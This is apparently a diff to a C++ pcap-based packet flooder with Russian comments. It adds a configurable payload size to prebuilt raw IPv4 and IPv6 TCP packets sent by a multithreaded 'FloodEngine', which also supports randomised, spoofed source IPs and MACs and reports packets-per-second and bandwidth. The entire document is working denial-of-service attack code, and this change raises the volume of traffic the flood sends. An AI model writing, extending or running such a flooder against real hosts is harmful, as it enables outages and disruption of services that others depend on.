@@ -5,7 +5,6 @@
 #include <vector>
 #include <thread>
 #include <atomic>
-#include <chrono>
 #include <memory>
 #include <cstring>
 #include <cstdint>
@@ -62,6 +61,7 @@ struct ipv6_header {
 };
 #pragma pack(pop)
 
+// ---------- утилиты ----------
 bool is_ipv6(const char* ip) {
     struct sockaddr_in6 sa6;
     return inet_pton(AF_INET6, ip, &sa6.sin6_addr) == 1;
@@ -180,6 +180,7 @@ void print_mac(const uint8_t mac[6]) {
     std::printf("\n");
 }
 
+// ---------- PrebuiltPacket с динамическим размером ----------
 class PrebuiltPacket {
 public:
     virtual ~PrebuiltPacket() = default;
@@ -194,8 +195,7 @@ public:
 
 class PrebuiltPacketIPv4 : public PrebuiltPacket {
 public:
-    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(ipv4_header) + sizeof(tcphdr);
-    alignas(64) uint8_t buffer[PACKET_SIZE];
+    std::vector<uint8_t> buffer;
     size_t src_mac_offset;
     size_t src_ip_offset;
     size_t src_port_offset;
@@ -204,23 +204,30 @@ public:
     uint32_t dst_ip;
     uint16_t dst_port;
     uint8_t dst_mac[6];
+    size_t payload_size;
 
-    PrebuiltPacketIPv4(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac, uint16_t dst_port)
+    PrebuiltPacketIPv4(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac,
+                       uint16_t dst_port, size_t packet_size)
         : src_ip(src_ip), dst_ip(dst_ip), dst_port(dst_port) {
         memcpy(this->dst_mac, dst_mac, 6);
-        memset(buffer, 0, PACKET_SIZE);
-        ether_header* eth = (ether_header*)buffer;
+        // минимальный размер: Eth(14) + IPv4(20) + TCP(20) = 54
+        size_t min_size = sizeof(ether_header) + sizeof(ipv4_header) + sizeof(tcphdr);
+        payload_size = (packet_size > min_size) ? (packet_size - min_size) : 0;
+        size_t total = min_size + payload_size;
+        buffer.resize(total, 0);
+
+        ether_header* eth = (ether_header*)buffer.data();
         memcpy(eth->ether_dhost, dst_mac, 6);
         memcpy(eth->ether_shost, src_mac, 6);
         eth->ether_type = htons(0x0800);
 
-        ipv4_header* ip = (ipv4_header*)(buffer + sizeof(ether_header));
+        ipv4_header* ip = (ipv4_header*)(buffer.data() + sizeof(ether_header));
         ip->version = 4; ip->ihl = 5; ip->tos = 0;
-        ip->tot_len = htons(sizeof(ipv4_header) + sizeof(tcphdr));
+        ip->tot_len = htons(sizeof(ipv4_header) + sizeof(tcphdr) + payload_size);
         ip->id = 0; ip->frag_off = 0; ip->ttl = 64; ip->protocol = 6; ip->check = 0;
         ip->saddr = src_ip; ip->daddr = dst_ip;
 
-        tcphdr* tcp = (tcphdr*)(buffer + sizeof(ether_header) + sizeof(ipv4_header));
+        tcphdr* tcp = (tcphdr*)(buffer.data() + sizeof(ether_header) + sizeof(ipv4_header));
         tcp->source = 0;
         tcp->dest = htons(dst_port);
         tcp->seq = 0;
@@ -231,32 +238,38 @@ public:
         tcp->check = 0;
         tcp->urg_ptr = 0;
 
+        // payload заполняется нулями (можно заменить на случайные)
+        if (payload_size > 0) {
+            uint8_t* payload = buffer.data() + sizeof(ether_header) + sizeof(ipv4_header) + sizeof(tcphdr);
+            memset(payload, 0, payload_size);
+        }
+
         src_mac_offset = offsetof(ether_header, ether_shost);
         src_ip_offset = sizeof(ether_header) + offsetof(ipv4_header, saddr);
         src_port_offset = sizeof(ether_header) + sizeof(ipv4_header) + offsetof(tcphdr, source);
         seq_offset = sizeof(ether_header) + sizeof(ipv4_header) + offsetof(tcphdr, seq);
     }
 
-    size_t getSize() const override { return PACKET_SIZE; }
-    const uint8_t* getBuffer() const override { return buffer; }
-    void setSrcMac(const uint8_t mac[6]) override { memcpy(buffer + src_mac_offset, mac, 6); }
+    size_t getSize() const override { return buffer.size(); }
+    const uint8_t* getBuffer() const override { return buffer.data(); }
+    void setSrcMac(const uint8_t mac[6]) override { memcpy(buffer.data() + src_mac_offset, mac, 6); }
     void setSrcIp(const void* ip) override {
         src_ip = *(uint32_t*)ip;
-        memcpy(buffer + src_ip_offset, ip, 4);
+        memcpy(buffer.data() + src_ip_offset, ip, 4);
     }
     void setSrcPort(uint16_t port) override {
         uint16_t net_port = htons(port);
-        memcpy(buffer + src_port_offset, &net_port, 2);
+        memcpy(buffer.data() + src_port_offset, &net_port, 2);
     }
     void setSeq(uint32_t seq) override {
         uint32_t net_seq = htonl(seq);
-        memcpy(buffer + seq_offset, &net_seq, 4);
+        memcpy(buffer.data() + seq_offset, &net_seq, 4);
     }
     void recalcChecksum() override {
-        ipv4_header* ip = (ipv4_header*)(buffer + sizeof(ether_header));
+        ipv4_header* ip = (ipv4_header*)(buffer.data() + sizeof(ether_header));
         ip->check = 0;
         ip->check = checksum((uint16_t*)ip, sizeof(ipv4_header));
-        tcphdr* tcp = (tcphdr*)(buffer + sizeof(ether_header) + sizeof(ipv4_header));
+        tcphdr* tcp = (tcphdr*)(buffer.data() + sizeof(ether_header) + sizeof(ipv4_header));
         tcp->check = 0;
         struct pseudo_header {
             uint32_t src;
@@ -269,18 +282,21 @@ public:
         ps.dst = dst_ip;
         ps.zero = 0;
         ps.proto = 6;
-        ps.len = htons(sizeof(tcphdr));
-        uint8_t pseudo_buf[sizeof(ps) + sizeof(tcphdr)];
-        memcpy(pseudo_buf, &ps, sizeof(ps));
-        memcpy(pseudo_buf + sizeof(ps), tcp, sizeof(tcphdr));
-        tcp->check = checksum((uint16_t*)pseudo_buf, sizeof(pseudo_buf));
+        ps.len = htons(sizeof(tcphdr) + payload_size);
+        std::vector<uint8_t> pseudo_buf(sizeof(ps) + sizeof(tcphdr) + payload_size);
+        memcpy(pseudo_buf.data(), &ps, sizeof(ps));
+        memcpy(pseudo_buf.data() + sizeof(ps), tcp, sizeof(tcphdr));
+        if (payload_size) {
+            uint8_t* payload = buffer.data() + sizeof(ether_header) + sizeof(ipv4_header) + sizeof(tcphdr);
+            memcpy(pseudo_buf.data() + sizeof(ps) + sizeof(tcphdr), payload, payload_size);
+        }
+        tcp->check = checksum((uint16_t*)pseudo_buf.data(), pseudo_buf.size());
     }
 };
 
 class PrebuiltPacketIPv6 : public PrebuiltPacket {
 public:
-    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(ipv6_header) + sizeof(tcphdr);
-    alignas(64) uint8_t buffer[PACKET_SIZE];
+    std::vector<uint8_t> buffer;
     size_t src_mac_offset;
     size_t src_ip_offset;
     size_t src_port_offset;
@@ -289,27 +305,33 @@ public:
     uint8_t dst_ip[16];
     uint16_t dst_port;
     uint8_t dst_mac[6];
+    size_t payload_size;
 
-    PrebuiltPacketIPv6(const uint8_t src_ip[16], uint8_t* src_mac, const uint8_t dst_ip[16], uint8_t* dst_mac, uint16_t dst_port)
+    PrebuiltPacketIPv6(const uint8_t src_ip[16], uint8_t* src_mac, const uint8_t dst_ip[16],
+                       uint8_t* dst_mac, uint16_t dst_port, size_t packet_size)
         : dst_port(dst_port) {
         memcpy(this->dst_mac, dst_mac, 6);
         memcpy(this->src_ip, src_ip, 16);
         memcpy(this->dst_ip, dst_ip, 16);
-        memset(buffer, 0, PACKET_SIZE);
-        ether_header* eth = (ether_header*)buffer;
+        size_t min_size = sizeof(ether_header) + sizeof(ipv6_header) + sizeof(tcphdr);
+        payload_size = (packet_size > min_size) ? (packet_size - min_size) : 0;
+        size_t total = min_size + payload_size;
+        buffer.resize(total, 0);
+
+        ether_header* eth = (ether_header*)buffer.data();
         memcpy(eth->ether_dhost, dst_mac, 6);
         memcpy(eth->ether_shost, src_mac, 6);
         eth->ether_type = htons(0x86DD);
 
-        ipv6_header* ip6 = (ipv6_header*)(buffer + sizeof(ether_header));
+        ipv6_header* ip6 = (ipv6_header*)(buffer.data() + sizeof(ether_header));
         ip6->vtc_flow = htonl(0x60000000);
-        ip6->payload_len = htons(sizeof(tcphdr));
+        ip6->payload_len = htons(sizeof(tcphdr) + payload_size);
         ip6->next_header = 6;
         ip6->hop_limit = 64;
         memcpy(ip6->saddr, src_ip, 16);
         memcpy(ip6->daddr, dst_ip, 16);
 
-        tcphdr* tcp = (tcphdr*)(buffer + sizeof(ether_header) + sizeof(ipv6_header));
+        tcphdr* tcp = (tcphdr*)(buffer.data() + sizeof(ether_header) + sizeof(ipv6_header));
         tcp->source = 0;
         tcp->dest = htons(dst_port);
         tcp->seq = 0;
@@ -320,26 +342,31 @@ public:
         tcp->check = 0;
         tcp->urg_ptr = 0;
 
+        if (payload_size) {
+            uint8_t* payload = buffer.data() + sizeof(ether_header) + sizeof(ipv6_header) + sizeof(tcphdr);
+            memset(payload, 0, payload_size);
+        }
+
         src_mac_offset = offsetof(ether_header, ether_shost);
         src_ip_offset = sizeof(ether_header) + offsetof(ipv6_header, saddr);
         src_port_offset = sizeof(ether_header) + sizeof(ipv6_header) + offsetof(tcphdr, source);
         seq_offset = sizeof(ether_header) + sizeof(ipv6_header) + offsetof(tcphdr, seq);
     }
 
-    size_t getSize() const override { return PACKET_SIZE; }
-    const uint8_t* getBuffer() const override { return buffer; }
-    void setSrcMac(const uint8_t mac[6]) override { memcpy(buffer + src_mac_offset, mac, 6); }
+    size_t getSize() const override { return buffer.size(); }
+    const uint8_t* getBuffer() const override { return buffer.data(); }
+    void setSrcMac(const uint8_t mac[6]) override { memcpy(buffer.data() + src_mac_offset, mac, 6); }
     void setSrcIp(const void* ip) override {
         memcpy(src_ip, ip, 16);
-        memcpy(buffer + src_ip_offset, ip, 16);
+        memcpy(buffer.data() + src_ip_offset, ip, 16);
     }
     void setSrcPort(uint16_t port) override {
         uint16_t net_port = htons(port);
-        memcpy(buffer + src_port_offset, &net_port, 2);
+        memcpy(buffer.data() + src_port_offset, &net_port, 2);
     }
     void setSeq(uint32_t seq) override {
         uint32_t net_seq = htonl(seq);
-        memcpy(buffer + seq_offset, &net_seq, 4);
+        memcpy(buffer.data() + seq_offset, &net_seq, 4);
     }
     void recalcChecksum() override {
         struct pseudo_ipv6 {
@@ -351,18 +378,23 @@ public:
         } ps;
         memcpy(ps.src, src_ip, 16);
         memcpy(ps.dst, dst_ip, 16);
-        ps.length = htonl(sizeof(tcphdr));
+        ps.length = htonl(sizeof(tcphdr) + payload_size);
         ps.zero[0] = ps.zero[1] = ps.zero[2] = 0;
         ps.next_header = 6;
-        tcphdr* tcp = (tcphdr*)(buffer + sizeof(ether_header) + sizeof(ipv6_header));
+        tcphdr* tcp = (tcphdr*)(buffer.data() + sizeof(ether_header) + sizeof(ipv6_header));
         tcp->check = 0;
-        uint8_t pseudo_buf[sizeof(ps) + sizeof(tcphdr)];
-        memcpy(pseudo_buf, &ps, sizeof(ps));
-        memcpy(pseudo_buf + sizeof(ps), tcp, sizeof(tcphdr));
-        tcp->check = checksum((uint16_t*)pseudo_buf, sizeof(pseudo_buf));
+        std::vector<uint8_t> pseudo_buf(sizeof(ps) + sizeof(tcphdr) + payload_size);
+        memcpy(pseudo_buf.data(), &ps, sizeof(ps));
+        memcpy(pseudo_buf.data() + sizeof(ps), tcp, sizeof(tcphdr));
+        if (payload_size) {
+            uint8_t* payload = buffer.data() + sizeof(ether_header) + sizeof(ipv6_header) + sizeof(tcphdr);
+            memcpy(pseudo_buf.data() + sizeof(ps) + sizeof(tcphdr), payload, payload_size);
+        }
+        tcp->check = checksum((uint16_t*)pseudo_buf.data(), pseudo_buf.size());
     }
 };
 
+// ---------- FloodEngine ----------
 class FloodEngine {
 private:
     pcap_t* pcap_handle;
@@ -377,14 +409,19 @@ private:
 public:
     FloodEngine(pcap_t* handle, void* src_ip, uint8_t* src_mac, void* dst_ip, uint8_t* dst_mac,
                 uint16_t dst_port, int thread_index, std::atomic<uint64_t>& total_counter,
-                std::atomic<bool>& stop, bool random_ip_flag, bool random_mac_flag, bool ipv6)
+                std::atomic<bool>& stop, bool random_ip_flag, bool random_mac_flag, bool ipv6,
+                size_t packet_size)
         : pcap_handle(handle), total_packets_sent(total_counter), stop_flag(stop),
           port_counter(1024 + thread_index * 1000), random_ip(random_ip_flag), random_mac(random_mac_flag),
           is_ipv6_mode(ipv6) {
         if (ipv6) {
-            packet = std::make_unique<PrebuiltPacketIPv6>((uint8_t*)src_ip, src_mac, (uint8_t*)dst_ip, dst_mac, dst_port);
+            packet = std::make_unique<PrebuiltPacketIPv6>((uint8_t*)src_ip, src_mac,
+                                                          (uint8_t*)dst_ip, dst_mac,
+                                                          dst_port, packet_size);
         } else {
-            packet = std::make_unique<PrebuiltPacketIPv4>(*(uint32_t*)src_ip, src_mac, *(uint32_t*)dst_ip, dst_mac, dst_port);
+            packet = std::make_unique<PrebuiltPacketIPv4>(*(uint32_t*)src_ip, src_mac,
+                                                          *(uint32_t*)dst_ip, dst_mac,
+                                                          dst_port, packet_size);
         }
     }
 
@@ -436,10 +473,11 @@ public:
     }
 };
 
+// ---------- main ----------
 int main(int argc, char* argv[]) {
     if (argc < 6) {
         std::cerr << "Usage: " << argv[0]
-                  << " <src_ip> <dst_ip> <dst_port> <threads> <duration_sec> [dst_mac] [--random-ip] [--random-mac]\n";
+                  << " <src_ip> <dst_ip> <dst_port> <threads> <duration_sec> [dst_mac] [--random-ip] [--random-mac] [--packet-size <bytes>]\n";
         return 1;
     }
 
@@ -471,11 +509,23 @@ int main(int argc, char* argv[]) {
 
     uint8_t dst_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
     bool random_ip = false, random_mac = false;
+    size_t packet_size = 0;  // 0 означает "минимальный"
+
     for (int i = 6; i < argc; i++) {
         if (strcmp(argv[i], "--random-ip") == 0) random_ip = true;
         else if (strcmp(argv[i], "--random-mac") == 0) random_mac = true;
+        else if (strcmp(argv[i], "--packet-size") == 0 && i+1 < argc) {
+            packet_size = atoi(argv[++i]);
+            if (packet_size == 0) packet_size = 54; // минимальный для IPv4 TCP
+        }
         else if (parse_mac_strict(argv[i], dst_mac)) { /* ok */ }
         else std::cerr << "Warning: unknown argument '" << argv[i] << "'\n";
+    }
+
+    // минимальные размеры
+    if (packet_size == 0) {
+        if (ipv6) packet_size = sizeof(ether_header) + sizeof(ipv6_header) + sizeof(tcphdr);
+        else      packet_size = sizeof(ether_header) + sizeof(ipv4_header) + sizeof(tcphdr);
     }
 
     SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
@@ -532,6 +582,7 @@ int main(int argc, char* argv[]) {
     std::cout << "Interface: " << ifname << "\nDestination MAC: "; print_mac(dst_mac);
     std::cout << "Random IP: " << (random_ip ? "yes" : "no") << "\nRandom MAC: " << (random_mac ? "yes" : "no") << "\n";
     std::cout << "IPv6 mode: " << (ipv6 ? "yes" : "no") << "\n";
+    std::cout << "Packet size: " << packet_size << " bytes\n";
 
     std::atomic<uint64_t> total_packets(0);
     std::atomic<bool> stop(false);
@@ -544,7 +595,8 @@ int main(int argc, char* argv[]) {
         void* src_ptr = ipv6 ? (void*)src_ip6 : (void*)&src_ip4;
         void* dst_ptr = ipv6 ? (void*)dst_ip6 : (void*)&dst_ip4;
         auto engine = std::make_unique<FloodEngine>(handles[i], src_ptr, src_mac, dst_ptr, dst_mac,
-                                                    dst_port, i, total_packets, stop, random_ip, random_mac, ipv6);
+                                                    dst_port, i, total_packets, stop, random_ip,
+                                                    random_mac, ipv6, packet_size);
         workers.emplace_back(&FloodEngine::start, engine.get(), i % cores);
         engine.release();
     }
@@ -558,8 +610,7 @@ int main(int argc, char* argv[]) {
     uint64_t pkts = total_packets.load();
     if (elapsed == 0) elapsed = 1;
     double pps = pkts * 1000.0 / elapsed;
-    size_t pkt_size = ipv6 ? PrebuiltPacketIPv6::PACKET_SIZE : PrebuiltPacketIPv4::PACKET_SIZE;
-    double mbps = (pps * pkt_size * 8) / 1e6;
+    double mbps = (pps * packet_size * 8) / 1e6;
     std::cout << "\n--- Results ---\nTotal packets: " << pkts << "\nDuration: " << elapsed << " ms\nThroughput: " << pps << " pps\nBandwidth: " << mbps << " Mbps\n";
     for (auto h : handles) pcap_close(h);
     return 0;
